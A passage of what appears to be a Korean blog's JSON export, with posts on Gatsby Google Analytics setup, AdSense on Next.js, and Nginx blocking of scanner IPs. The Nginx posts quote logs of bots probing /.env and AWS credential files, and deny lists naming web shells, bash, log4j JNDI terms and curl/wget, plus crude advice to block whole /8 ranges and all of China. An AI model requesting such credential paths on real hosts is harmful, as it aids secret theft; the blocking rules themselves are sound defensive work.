},\n},\n```\n\n<br>\n\n### 2. gatsby-plugin-gtag 설치\n\n아래의 명령어를 통해서 설치해주자.  \n혹시 이 플러그인이 궁금하면 [gatsby-plugin-gtag](https://www.gatsbyjs.com/plugins/gatsby-plugin-gtag/) 공식 페이지를 참고하자.\n\n```\nnpm install --save gatsby-plugin-gtag\n```\n\n<br>\n\n### 3. config 수정\n\n**gatsby-config.js**파일을 수정한다.  \n아래와 같이 플러그인 설정을 하나 밀어 넣는다.\n\n```\n {\n    module.exports = {\n        siteMetadata: metaConfig,\n        plugins: [\n            {...기타 옵션}\n\n            //아래가 밀어넣을 옵션\n            {\n                resolve: `gatsby-plugin-gtag`,\n                options: {\n                    trackingId: metaConfig.ga,\n                    head: true,\n                    anonymize: true,\n                },\n            }\n        ]\n    }\n},\n```\n\n저기 위에서 **trackingId**의 경우 직접 문자열 값을 줘도 된다.  \n나 같은 경우 **metaConfig**라는 config 설정에서 값을 가져오는데 아래와 같이 처리해도 무방하다.\n\n```\ntrackingId: \"G-ABCD1234\",,\n```\n\n당연한 이야기겠지만 나처럼 할 경우 **metaConfig**값을 변경해야 한다.\n\n<br>\n\n### 4. 빌드 또는 배포\n\n보통 나랑 같은 테마를 쓰거나 또는 다른 테마를 써도 배포할 때는 빌드를 할 것이다.  \n그래서 빌드를 따로 하거나, 배포를 해준다.\n\n```\n\"deploy\": \"gatsby build && gh-pages -d public -b ....\",\n```\n\n위는 내 배포 명령어인데 앞에 빌드를 선행한다.  \n그리고 바로 되지 않고, 약 5~30분?\n\n난 30분 정도 지나니까 아래처럼 수신으로 바뀌었다.\n\n![](/img03.png)\n\n## 정리\n\n근데 이렇게 해도 잠깐 끊겨서 다시 48시간 동안 수집한 정보다 없다고 할 수 있다.  \n하지만 시간이 또 흐르면 저렇게 활성화 되었다고 뜨니 너무 걱정하지 말자.\n\n여차하면 [크롬 익스텐션-Google Analytics Debugger](https://chrome.google.com/webstore/detail/google-analytics-debugger/jnkmfdileelhofjcijamephohjechhna)를 설치해서 써보자.  \n설치 후 활성화되고 난 뒤 디버거 콘솔을 열면 아래처럼 정보가 뜬다.\n\n![](/img04.png)\n\n만약 정보가 안뜨면 뭔가 설정을 빠트리거나 문제가 생긴 것이니 다시 확인해보자.\n\n```toc\n\n```\n"},{"excerpt":"흑우집합소에 애드센스를 준비하던 도중... 혹시 Next.Js에서 애드센스를 다는 것이 궁금하면 Next.Js에 구글 애드센스(Adsense) 등록하기포스팅을 참고하자. 뭐 아직 이르긴 하지만 구글 광고를 달려고 Adsense를 신청했었다. 근데 신청 후 몇일 뒤 아래와 같은 메일이 왔다.  뭐가 문젠지 봤더니 승인 상태 옆에 저렇게 찾을 수 없음이 뜬다…","fields":{"slug":"/til/230403_til/"},"frontmatter":{"date":"April 04, 2023","title":"23년 4월 3일 TIL & 개발노트 (Google Bot)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n# 흑우집합소에 애드센스를 준비하던 도중...\n\n혹시 Next.Js에서 애드센스를 다는 것이 궁금하면 [Next.Js에 구글 애드센스(Adsense) 등록하기](https://elfinlas.github.io/next-js/230404_nextjs_in_adsense/)포스팅을 참고하자.\n\n뭐 아직 이르긴 하지만 구글 광고를 달려고 **Adsense**를 신청했었다.  \n근데 신청 후 몇일 뒤 아래와 같은 메일이 왔다.\n\n![](/img01.png)\n\n뭐가 문젠지 봤더니 승인 상태 옆에 저렇게 찾을 수 없음이 뜬다.\n\n![](/img02.png)\n\n## 문제는 쉽게 찾을 수 있었다.\n\n먼저 ads.txt에 접근이 되어야 하는데 이상하게 접근이 되지 않았다.\n\n일전에 [Nginx에서 특정 IP 접근 금지 시키기](https://elfinlas.github.io/nginx/230401_defense_attacker/) 포스팅을 하면서 뭔가 본거 같기도...  \n그래서 포스팅을 확인해본 결과...\n\n```\n~*(idx_config|DS_Store|nginx|wp-json|ads|humans|exec|level|monitoring|configprops|balancer|actuator) 1;\n```\n\n**Url Keyword**방식을 적은 부분에서 **ads**단어가 있었다...\n\n이래서 **ads.txt** 파일에 접근이 불가능했던 것이다.  \n그래서 접근 확인을 한 후 재검토를 신청했다.\n\n## 응 거절이야~\n\n또 저 해맑은 아저씨 메일이 왔다 -\\_-;;  \n그래서 몇개 생각을 하다가 Nginx에서 막은게 문제겠지 싶었다.\n\n그러다가 하나 생각이 난게 IP 접근에서 뭔가 있었던 것 같았다.  \n그래서 불법 침입 시도를 확인할 겸 접근 로그를 보다가...\n\n```\n66.249.66.65 - - [03/Apr/2023:00:22:03 +0900] \"GET /robots.txt HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\"\n66.249.66.89 - - [03/Apr/2023:00:24:00 +0900] \"GET /robots.txt HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\"\n```\n\n그렇다...  \n내가 구글 봇 클라이언트를 막은 것 같았다...\n\n근데 구글 봇 클라이언트가 저거 하나만 돌지 아니면 여려 개 돌지 확인할 수 있는 방법이 없었다.  \n그럼 궁금하니 **ChatGPT**에게 기대를 걸고 물어봤다.\n\n![](/img03.png)\n\n한글과 영어로 물어봤지만...  \n자기도 모른다 한다.. -\\_-;;\n\n그래서 직접 내가 찾아봤다.\n\n![](/img04.png)\n\n근데 다 나오진 않고 일부만 주고 정보를 파는 사이트였다.\n\n[](https://searchengineland.com/google-publishes-the-list-of-googlebot-ip-addresses-375935)\n\n그래서 21년도 자료긴 한데 [구글봇 주소 정보글(영문)](https://searchengineland.com/google-publishes-the-list-of-googlebot-ip-addresses-375935)에서 약간의 정보를 찾을 수 있었다.  \n저 본문 중 구글 봇의 범위 주소 (IpV4(서브넷으로 나뉨), IpV6)를 [공개한 구글봇 주소 공식 api](https://developers.google.com/search/apis/ipranges/googlebot.json)를 확인해봤다.\n\n![](/img05.png)\n\n일단 최신 자료이고, 하단에 ipv4 정보도 있었다.\n\n![](/img06.png)\n\n그래서 저기 나온 주소를 토대로 내가 막은게 있나 봤다.\n\n```\ngeo $bad_ip_range {\n\t# A\n    34.0.0.0/8 1; #22-07-01 => Google Bot 있을 수 있음\n\t103.0.0.0/8 1; #VN-21-11-29\n  \t185.0.0.0/8 1; #DE-21-12-27\n\t159.0.0.0/8 1; #22-04-17\n\t20.0.0.0/8 1; #22-04-30\n\t15.0.0.0/8 1; #22-06-10\n\t51.0.0.0/8 1; #22-06-27\n\t35.0.0.0/8 1; #22-07-01\n\n    # B\n    66.249.0.0/16 1; #US_21-11-15 => Google Bot 있을 수 있음\n  \t5.161.0.0/16 1; #22-01-02\n  \t45.83.0.0/16 1; #log4j\n}\n```\n\n그렇다...  \n범위 계열에서 A클래스 주소 중 34 주소를 다 막아버린 것이다... -\\_-;;;\n\n그리고 B클래스에서도 막은 곳이 있었다.  \n얼른 이 부분은 주석 처리 후 Nginx를 리스타트 했다.\n\nC 클래스에는 다행히 없었다.  \n그리고 각 Ip 밴 시킨 부분도 몇 개 검토해서 다시 풀었다.\n\n## 정리\n\n이제 한번 기다려보면 될 것 같다.  \n근데 구글 문서에서 몇 가지 찾은 정보가 있는데, 유저 에이전트를 확인하라고 한다.\n\n[Google 크롤러(사용자 에이전트) 개요](https://developers.google.com/search/docs/crawling-indexing/overview-google-crawlers?hl=ko) 페이지를 참고하자.  \n그리고 [Googlebot과 다른 Google 크롤러 확인](https://developers.google.com/search/docs/advanced/crawling/verifying-googlebot?hl=ko#use-automatic-solutions) 이라는 문서도 있다.\n\n여기에 의하면 **host** 명령어를 통해서 해당 에이전트를 확인하라고 하는데 아래와 같이 확인이 가능했다.\n먼저 역방향 DNS를 조회해본다.\n\n![](/img07.png)\n\n그럼 domain name에 google-proxy-...값이 뜨는데 이 값을 이용해 순방향 DNS를 조회해본다.\n\n![](/img08.png)\n\n그럼 처음 접근한 주소의 IP와 순방향 조회 IP를 비교해서 같으면 된다.\n\n근데 [공개한 구글봇 주소 공식 api](https://developers.google.com/search/apis/ipranges/googlebot.json)문서를 통해서 자동으로 차단 처리를 할 수 있을 듯 한데...  \n이건 좀 나중에 해봐야겠다.\n\n```toc\n\n```\n"},{"excerpt":"구글 애드센스를 달아보려... 흑우집합소에 애드센스를 달려고 했다. 근데 ads.txt 파일만 넣었는데 뭔가 안되는거 같아서 찾아보니 대부분 Script 추가 방식을 사용했다.. 그래서 나도 이 방식도 같이 추가했고, 이를 포스팅으로 남긴다. How To? 먼저 Google adsense에 가입이 다 되어 있고 준비가 된 것을 가정한다.  메뉴에서 사이트…","fields":{"slug":"/next-js/230404_nextjs_in_adsense/"},"frontmatter":{"date":"April 04, 2023","title":"Next.Js에 구글 애드센스(Adsense) 등록하기","description":null,"tags":["NextJs","Adsense"],"series":"NextJs","previewImage":"nextjs_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nextjs.png)\n\n# 구글 애드센스를 달아보려...\n\n흑우집합소에 애드센스를 달려고 했다.  \n근데 ads.txt 파일만 넣었는데 뭔가 안되는거 같아서 찾아보니 대부분 Script 추가 방식을 사용했다..\n\n그래서 나도 이 방식도 같이 추가했고, 이를 포스팅으로 남긴다.\n\n## How To?\n\n먼저 [Google adsense](https://adsense.google.com/intl/ko_kr/start/)에 가입이 다 되어 있고 준비가 된 것을 가정한다.\n\n![](/img01.png)\n\n메뉴에서 사이트를 선택한다.  \n그리고 새 사이트 추가를 해준다.\n\n![](/img02.png)\n\n추가할 사이트 주소를 작성해준다.\n\n![](/img03.png)\n\n그럼 두 가지 방식으로 검증을 받을 수 있다.  \n여기서 원하는 방식을 선택하거나, 나처럼 하나가 안되서 다른 방식으로 인증을 해도 된다.\n\n<br>\n\n### 1. Script 인증 방식\n\n스크립트 인증 방식은 별도의 **script** 태그를 추가해서 인증을 받는 방식이다.\n\n![](/img04.png)\n\n여기서 나온 스크립트는 바닐라js용이고, 비슷하지만 Next.Js에서는 다음과 같이 해준다.  \n아래의 코드를 **Head** 태그 내에 넣어야 하는데 보통 **\\_app.tsx**에 넣을 것이다.\n\n근데 나는 **Head**태그 위치가 **\\_document.tsx**라서 저 곳에 넣었다.  \n근데 Google analytics는 **\\_app.tsx**에 넣어도 잘 되는거 보면 크게 상관 없지 않을까 싶다.\n\n그 전에 위에 나온 사진에서 **client**쪽의 쿼리 값인 **ca-pub**을 난 따로 설정으로 빼줬다.\n\nNext.js에서 설정 파일은 .env 두고 쓰는데,  \n설정을 클라이언트 쪽에서 쓰기에 앞에 **NEXT_PUBLIC**접두사를 붙임으로써 접근 가능하게 해줬다.\n\n그래서 아래와 같은 설정을 붙여서 작성하였다.\n\n```tsx\nrender() {\n        return (\n            <Html lang=\"ko\" data-theme=\"emerald\">\n                <Head>\n                    <meta\n                        httpEquiv=\"X-UA-Compatible\"\n                        content=\"IE=edge,chrome=1\"\n                    />\n                    //기타 meta 및 html 코드\n\n                    <Script\n                        async\n                        src={`https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=${process.env.NEXT_PUBLIC_GOOGLE_ADS_CLIENT_ID}`}\n                        strategy=\"lazyOnload\"\n                        crossOrigin=\"anonymous\"\n                    />\n\n                </Head>\n\n                <body>\n                    ....\n                </body>\n            </Html>\n        );\n}\n```\n\n이렇게 해주면 **Script 인증 방식**은 끝이다.\n\n<br>\n\n### 2. Ads.txt 인증 방식\n\n이건 1. 방식보다 더 쉽다.(?)\n\n![](/img05.png)\n\n저기 스니펫을 복사해준다.  \n그리고 Next.Js의 폴더 중에 **public** 디렉토리에 **ads.txt**라는 파일을 하나 만들어준다.\n\n![](/img06.png)\n\n이렇게 하면 끝이다.  \n자신의 사이트에서 뒤에 ads.txt 접근이 가능하면 끝이다.\n\n예를 들어 abc.com/ads.txt 했을 때 저 문구가 나오면 된다.\n\n## 정리\n\n이렇게 만든 다음 배포하면 끝이다.  \n물론 이렇게만 한다고 구글에 광고를 바로 내어주진 않고 검토를 하고 준다.\n\n그리고 광고가 게재될 영역도 만들어줘야 한다.  \n근데 이 부분은 일단 광고 승인이 난 뒤에 포스팅 해봐야겠다.\n\n```toc\n\n```\n"},{"excerpt":"서비스를 열어두면... 오픈을 하고나면 정말 많은 일들이 생긴다. 도메인 주소를 어떻게 알고 이상한 메일들도 오고, 다양한 방법으로 연락이 온다. -_-;; 그래봤자 넷상이니까? 근데 이제 서비스 접근 로그 또는 nginx에 접근 로그를 보면 대환장 파티다. 이건 내 Nginx 접근 기록에서 따온 로그 중 일부다. 저기 109.237.98.53IP 접근을…","fields":{"slug":"/nginx/230401_defense_attacker/"},"frontmatter":{"date":"April 01, 2023","title":"Nginx에서 특정 IP 접근 금지 시키기 (With Url 문자열 접근 막기)","description":null,"tags":["Nginx"],"series":"Nginx","previewImage":"nginx_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nginx.jpg)\n\n# 서비스를 열어두면...\n\n오픈을 하고나면 정말 많은 일들이 생긴다.  \n도메인 주소를 어떻게 알고 이상한 메일들도 오고, 다양한 방법으로 연락이 온다. -\\_-;;\n\n그래봤자 넷상이니까?  \n근데 이제 서비스 접근 로그 또는 nginx에 접근 로그를 보면 대환장 파티다.\n\n```\n128.90.135.254 - - [04/Feb/2023:14:03:43 +0000] \"GET / HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0\"\n159.223.56.86 - - [04/Feb/2023:14:17:38 +0000] \"GET / HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n20.231.80.56 - - [04/Feb/2023:14:24:53 +0000] \"GET /wp-login.php HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:09 +0000] \"GET /.env HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:10 +0000] \"POST /.env HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:10 +0000] \"GET /.aws/credentials HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:11 +0000] \"POST /.aws/credentials HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:12 +0000] \"GET /.aws/config HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:12 +0000] \"POST /.aws/config HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:13 +0000] \"GET /aws/credentials HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:14 +0000] \"POST /aws/credentials HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:14 +0000] \"GET /credentials HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:15 +0000] \"POST /credentials HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:16 +0000] \"GET /test.php HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:16 +0000] \"POST /test.php HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:17 +0000] \"GET /laravel/.env HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:17 +0000] \"POST /laravel/.env HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:18 +0000] \"GET /demo/.env HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:19 +0000] \"POST /demo/.env HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:19 +0000] \"GET /web/.env HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:20 +0000] \"POST /web/.env HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:21 +0000] \"GET /phpinfo HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n109.237.98.53 - - [04/Feb/2023:14:41:21 +0000] \"POST /phpinfo HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n178.62.72.53 - - [04/Feb/2023:20:28:52 +0000] \"GET / HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n159.223.56.86 - - [04/Feb/2023:23:44:00 +0000] \"GET / HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n165.227.89.199 - - [05/Feb/2023:00:23:58 +0000] \"GET / HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n159.223.56.86 - - [05/Feb/2023:01:15:39 +0000] \"GET / HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n5.62.58.235 - - [05/Feb/2023:02:16:29 +0000] \"GET / HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n205.210.31.157 - - [05/Feb/2023:04:08:24 +0000] \"GET / HTTP/1.1\" 301 178 \"-\" \"Xpanse, a Palo Alto Networks company, indexes customer network perimeters. If you have any questions or concerns, please reach out to: scaninfo@paloaltonetworks.com.\"\n```\n\n<br>\n\n이건 내 Nginx 접근 기록에서 따온 로그 중 일부다.  \n저기 **109.237.98.53**IP 접근을 보라.\n\n파이썬이나 기타 언어로 봇 만들어서 취약점을 열심히 찾는...  \n참 부지런하다...\n\n난 게을러서 저런 노력도 못할 듯 싶다 -\\_-;;  \n무튼 서비스가 오픈되면 어떻게들 귀신같이 알고 저렇게 온다.\n\n![](/img01.jpg)\n\n<br>\n\n무튼 예전부터 나는 이걸 보호할 방법을 찾았고 적용했었다.  \n그리고 포스팅 해야지 하다가..(아마 흑우집합소 1세대쯤이었...)\n\n그래서 이걸 이제야 포스팅 해본다.\n\n## How To?\n\n일단 nginx가 설치되어 있다는 것을 가정한다.  \nnginx의 기본 설정 파일을 vim이던 원하는 편집기로 연다.\n\n보통은 경로가 **/etc/nginx/nginx.conf** 일거다.  \n물론 보안을 생각하면 다른 장소로 옮겨둔 사람도 있겠지만...\n\n이 conf파일에 작성해도 좋지만 나 같은 경우 따로 빼뒀다.\n\n```\nhttp {\n    ## Some Config\n\n    ## 별도 경로로 빼둔 설정파일들\n\tinclude /home/mymy/nginx/ip-block-list.conf;  #ip block\n  \tinclude /home/mymy/nginx/hack_word.conf; #Hack word\n  \tinclude /home/mymy/nginx/ip-range-block-list.conf; #ip range block\n}\n```\n\n저 설정파일들은 nginx에서 사용할 변수를 만들어 둔 파일들이다.  \n그리고 저 설정파일들은 아래서 더 자세하게 설명하겠다.\n\n<br>\n\n### 개별 IP 막기\n\n위의 **ip-block-list.conf** 파일에는 다음과 같이 되어 있다.\n\n```\ngeo $bad_ip {\n    5.62.41.163 1;\n    5.62.58.235 1;\n    default 0;\n}\n```\n\n상단에 geo를 적고 **\\$**표시가 변수 이름이다.  \n그리고 안에 값은 밴 시킬 ip는 1을 주고, 그 외는 허용하려 하기에 0을 줬다.\n\n여기까지 하고 되면 참 좋겠지만...  \n이제 몇 가지 설정이 남았다.\n\n다시 nginx.conf 파일을 열거나 자신의 서비스에 맞는 설정을 빼뒀으면 그 config를 열어준다.\n\n```\nserver {\n  #기본 설정\n  listen 80;\n  listen [::]:80;\n  root /var/www/html;\n\n  server_name bcow.world;\n\n  #Ban black ip\n  if ($bad_ip) { return 444; }\n\n  #Ban ip range\n  if ($bad_ip_range) { return 444;  }\n\n  #특정 url 패턴을 거부\n  if ($bad_word = 1) { return 444; }\n\n  underscores_in_headers    on;  #1. 언더형식의 헤더를 허용 합니다.\n\n  #실제 사용 처리\n  location / {\n    proxy_set_header Range $saferange;\n\n    proxy_pass http://localhost:11122334;\n    proxy_pass_request_headers\ton; ## 요청 헤더 바로 전달\n  }\n}\n```\n\n설정을 저렇게 해주면 된다.  \n**if (\\$bad_ip) { return 444; }** 이 설정으로 인해,  \n해당 IP는 444응답... 즉 아무 응답도 못받고 죽은 서버라는 응답을 받게 된다.\n\n만약 특정 Ip 영역대를 밴 시키고 싶다면?\n\n<br>\n\n### IP Class로 막기\n\nIP는 알다시피 A클래스, B클래스, C클래스 영역으로 나눠져있다.  \n그리고 서브넷 등등...\n\n자세한 건 네트워크 쪽 찾아보거나 시스코의 CCNA 자격증 공부하면 줄기차게 나온다.  \n무튼...\n\n이번엔 위에서 설명된 **ip-range-block-list.conf** 설정을 열람해보자\n\n```\ngeo $bad_ip_range {\n\t# A\n\t103.0.0.0/8 1; #VN-21-11-29\n  \t185.0.0.0/8 1; #DE-21-12-27\n\n    # B\n  \t5.161.0.0/16 1; #22-01-02\n  \t45.83.0.0/16 1; #log4j\n\n    # C\n  \t77.111.247.0/24 1; #NO-21-12-16\n  \t167.172.62.0/24 1; #22-01-02\n\n    default 0;\n}\n```\n\n얘도 아까 단일 Ip랑 같은 설정을 가진다.  \n단지 A클래스일 경우 앞 대역 주소를 적고 나머진 0.0.0 즉 해당 네트워크 주소(시작 주소)를 적어둔다.\n\n그리고 뒤에 서브넷을 입력한다.  \nA클래스니까 당연 서브넷은 8이다.\n\nB랑 C는 A랑 같기에 설명은 생략한다.\n\n![](/img04.jpeg)\n\n무튼 이것도 변수를 선언하고 메인 설정에서 단일 Ip 밴시키듯 아래 설정을 두면 된다.\n\n```\n#Ban ip range\n  if ($bad_ip_range) { return 444;  }\n```\n\n근데 이 블록 Ip는 잘보고 막자.  \n가끔 B클래스가 같은거 같아서 막 막다보면 엄한 영역도 막을 수 있다.\n\n그래서 ip조회 서비스 등을 조회해서 대상 B클래스 주소가 같은 지역 같은 호스트,  \n비슷한 것 같으면 그 때 막는게 좋다.\n\n![](/img03.png)\n\n이건 [IP-API](https://ip-api.com/)사이트에서 조회한 것인데 저렇게 밑에 hosting이라 되어 있으면 일단 막는게 좋다.  \n그리고 사진에 나온 것처럼 미국인데 asname이 텐센트...\n\n물론 클라우드를 통해 접근해서 지역은 상관 없긴 하지만...  \n일단 중국은 다 막자.\n\n다음은 url에 특정 키워드가 포함된 것을 잡는 것을 알아보자.\n\n<br>\n\n### Url keyword\n\n이것도 원리는 같다.  \n**hack_word.conf** 설정 파일을 보자.\n\n```\n#Request Bad Word\nmap $request_uri $bad_word {\n\tdefault 0;\n\t~*(wp-includes|wlwmanifest|xmlrpc|wordpress|administrator|wp-admin|wp-login|owa|a2billing) 1;\n\t~*(fgt_lang|flu|stalker_portal|streaming|system_api|exporttool|ecp|vendor|LogService|invoke|phpinfo) 1;\n\t~*(Autodiscover|console|eval-stdin|staging|magento|demo|rss|root|mifs|git|graphql|sidekiq|c99|GponForm) 1;\n\t~*(header-rollup-554|fckeditor|ajax|misc|plugins|execute-solution|wp-content|php|telescope) 1;\n\t~*(idx_config|DS_Store|nginx|wp-json|ads|humans|exec|level|monitoring|configprops|balancer|actuator) 1;\n\t~*(meta-data|web_shell_cmd|latest|remote|_asterisk|bash|Bind|binding|appxz|bankCheck|GetAllGameCategory) 1;\n\t~*(exchangerateuserconfig|exchange_article|kline_week|anquan|dns-query|nsepa_setup|java_script|gemini-iptv) 1;\n\t~*(j_spring_security_check|wps|cgi|asmx|HNAP1|sdk|evox) 1;\n\t~*(_ignition|alvzpxkr|ALFA_DATA|wp-plain) 1;\n\t~*(ldap|jndi|dns|securityscan|rmi|ldaps|iiop|corba|nds|nis) 1; # log4j\n}\n```\n\n일단 내가 주로 막는 유형만 가져왔다.  \n저렇게 하면 url에 저 키워드가 들어가면 조건에 걸린다.\n\n내가 집요하게 로그를 분석하며 취약점 찾으려 들어온 놈들 키워드를 분석했다.  \n이것도 메인 설정에 박아두면 된다.\n\n```\nif ($bad_word = 1) { return 444; }\n```\n\n이렇게 하면 어느정도 취약점 찾는 놈들은 막을 수 있을 것이다.\n\n## 기타\n\n또 막는 설정은 다양한게 있겠지만...\n\n요새는 영악해서 가짜 UA 달고 오는게 예의지만...  \nUserAgent 공백으로 오는 무성의한 놈들도 있다. (아주 가끔...)\n\n이런 놈들은 아래 설정으로 막을 수 있다.\n\n```\n#공백 UserAgent 차단\nif (\\$http_user_agent = \"\") { return 444; }\n```\n\n그리고 악의적인 행위로 유명한 봇들도 있다.  \n이건 아래 내용을 참고하자.\n\n```\n#Bot\nmap $http_user_agent $limit_bots {\n        default 0;\n        ~*(MJ12bot|ltx71|Adsbot/3.1/WordPress|BLEXBot|UCBrowser|Mb2345Browser) 1;\n        ~*(MicroMessenger|LieBaoFast|Headless|netEstate|PetalBot) 1;\n        ~*(bingbot|FeedDemon|GrapeshotCrawler|DuckDuckBot|MegaIndex) 1;\n        ~*(VelenPublicWebCrawler|SimplePie|YandexBot|SCMGUARD|DotBot) 1;\n        ~*(AhrefsBot|SemrushBot) 1;\n\t~*(wget|curl) 1;\n    }\n```\n\n이걸 또 메인 설정(또는 개인 서비스 설정)에 아래와 같이 넣어준다.\n\n```\n#불필요 로봇 차단\nif (\\$limit_bots = 1) { return 444; }\n```\n\n이렇게하면 일단 가드를 완전히 올린 셋팅은 아니지만 어중이 떠중이는 못들어오게 막아준다.\n\n<br>\n\nnginx 책도 빌렸는데 공부를 좀 해서 더 견고하게 막아보도록 노오력해봐야겠다.  \n아래는 범위 ip 설정을 올려본다.\n\n단일은 진짜 넘 커서...  \n이건 깃허브나 파일로 제공해야 할 듯 싶다.\n\n해외 서비스 하는 분은 잘 알아보고 적용하고,  \n국내나 국외 크게 신경 안쓰시는 분은 아래 내용을 참고하자.\n\n```\ngeo $bad_ip_range {\n\t# A\n    #34.0.0.0/8 1; #22-07-01 => Google Bot 있을 수 있음\n\t103.0.0.0/8 1; #VN-21-11-29\n  \t185.0.0.0/8 1; #DE-21-12-27\n\t159.0.0.0/8 1; #22-04-17\n\t20.0.0.0/8 1; #22-04-30\n\t15.0.0.0/8 1; #22-06-10\n\t51.0.0.0/8 1; #22-06-27\n\t35.0.0.0/8 1; #22-07-01\n\n  \t# B\n    # 66.249.0.0/16 1; #US_21-11-15 => Google Bot 있을 수 있음\n  \t5.161.0.0/16 1; 